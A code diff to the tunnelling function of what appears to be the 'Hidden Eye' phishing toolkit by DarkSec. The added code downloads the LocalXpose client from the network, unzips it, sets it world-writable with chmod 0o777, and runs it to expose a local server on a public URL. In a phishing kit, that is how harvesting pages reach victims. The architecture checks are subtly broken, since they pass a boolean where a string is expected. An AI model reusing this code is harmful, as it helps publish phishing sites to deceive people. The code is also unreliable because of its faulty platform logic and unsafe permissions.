@@ -263,19 +263,45 @@ def start_serveo(port):
 
 
 def start_localxpose(port):
+    localxpose_file = "External_Software/loclx"
+    localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm64.zip"
+    
+    if path.isfile(localxpose_file):
+        pass
+    else:
+        if simple_informant.check_platform("system") == "Linux" and simple_informant.check_platform("architecture" == "x86_64"):
+            localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-amd64.zip"
+        elif simple_informant.check_platform("system") == "Linux" and simple_informant.check_platform("architecture" == "aarch64"):
+            localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm64.zip"
+        
+        with url_request.urlopen(localxpose_url) as loclxzip:
+            with ZipFile(BytesIO(loclxzip.read())) as zip_file:
+                zip_file.extractall("External_Software")
+        chmod('External_Software/loclx', 0o777)
+    
+   
+                    
     def random(port):
         run_command('clear')
-        print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------'''.format(
-            default_palette[1], default_palette[2]))
-       
-        run_command(['Server/loclx', 'tunnel', 'http', '--to', ':{0}'.format(port), '>', 'link.url'], stdout=DEVNULL,
-                    stderr=DEVNULL)
-        wait(8)
+        #print('''
+        #{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        #|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        #|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        #{0}http://github.com/darksecdevelopers
+        
+        #{0}** BY:DARKSEC ** \n\n-------------------------------\
+            # n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------'''.format(
+        #    default_palette[1], default_palette[2]))
+        print(global_localization.hidden_eye_logo)
+        print(global_localization.official_website_link)
+        print(global_localization.by_darksec)
+        print(global_localization.line_of_dots)
+        print(localization.lang_start_localxpose["localxpose_random_server"])
+        #run_command(['Server/loclx', 'tunnel', 'http', '--to', ':{0}'.format(port), '>', 'link.url'], stdout=DEVNULL,
+        #          stderr=DEVNULL)
+        #wait(8)
+        run_command(['External_Software/loclx', 'tunnel', 'http', '--to', ':{0}'.format(port), '>', 'link.url'], stdout=DEVNULL, stderr=DEVNULL)
+        
         try:
             output = check_output(
                 "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
